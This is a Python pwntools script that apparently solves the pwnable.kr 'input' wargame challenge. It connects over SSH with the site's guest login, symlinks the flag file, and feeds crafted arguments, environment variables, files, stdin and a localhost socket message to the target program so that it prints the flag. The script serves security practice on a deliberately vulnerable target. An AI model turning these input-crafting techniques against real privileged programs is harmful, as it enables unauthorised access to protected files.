#!/usr/bin/env python3 
# this is a shit show
import pwn
import logging
import sys
import time
#pwn.context.log_level = logging.ERROR

remote = True

#sh = s.shell()

tmp_dir = "/tmp/veryfuckinglongdirectoryname"
if remote:
	s = pwn.ssh("input2", "pwnable.kr", 2222, "guest")
	s.process(["mkdir", "-p", tmp_dir]).readall()
	s.process(["ln", "-s", "/home/input2/flag", f"{tmp_dir}/flag"]).readall()
else:
	pwn.process(["mkdir", "-p", tmp_dir]).readall()
	pwn.process(["ln", "-s", "/home/input2/flag", f"{tmp_dir}/flag"]).readall()



#p = pwn.process(["nc", "pwnable.kr", ""])

# stage 1
args = [""] * 100
if remote:
	args[0] = "/home/input2/input"
else:
	args[0] = "/home/user/hacking/pwnable.kr/toddlers_bottle/input2/input"
#args[ord('A')] = "\x00"
args[ord('B')] = b"\x20\x0a\x0d"

long_filename = "a" * 50 + "B" * 30
if not remote:
	with open(f"/tmp/{long_filename}", "w") as f:
		f.buffer.write(bytes([0x0, 0xa, 0x2, 0xff]))
else:
	pass
	s.upload_data(bytes([0x0, 0xa, 0x2, 0xff]), f"/tmp/{long_filename}")
#print (stderr.read())

# stage 3
env = {b"\xde\xad\xbe\xef" : b"\xca\xfe\xba\xbe"}

# stage 4
if not remote:
	with open(f"{tmp_dir}/\x0a", "w") as f:
		f.buffer.write(b"\x00\x00\x00\x00")
else:
	s.process(["python3", "-c", "open('\\n', 'w').write('\\x00'*4)"], cwd = tmp_dir).readall()
	#s.process(["touch", "{tmp_dir}/\n"]).readall()
	#s.upload_data(bytes([0] * 4), b"{tmp_dir}/\x0a")

# stage 5
port = "5007"
args[ord('C')] = port



#p = s.process(["./input2"] + args, env = env)
if not remote:
	p = pwn.process(args, env = env, stderr = open(f"/tmp/{long_filename}", "r"), cwd=tmp_dir)
else:
	p = s.process(args, env = env, stderr = f"/tmp/{long_filename}", cwd=tmp_dir)

# stage 2
p.send(b"\x00\x0a\x00\xff")


# stage 4
if True:
	if not remote:
		nc = pwn.process(["nc", "localhost", port])
	else:
		nc = s.process(["nc", "localhost", port])

	nc.send("\xde\xad\xbe\xef")

for i in range(8):
	p.readline()

#p.shell().interactive()


print(p.readline().decode("utf-8"))
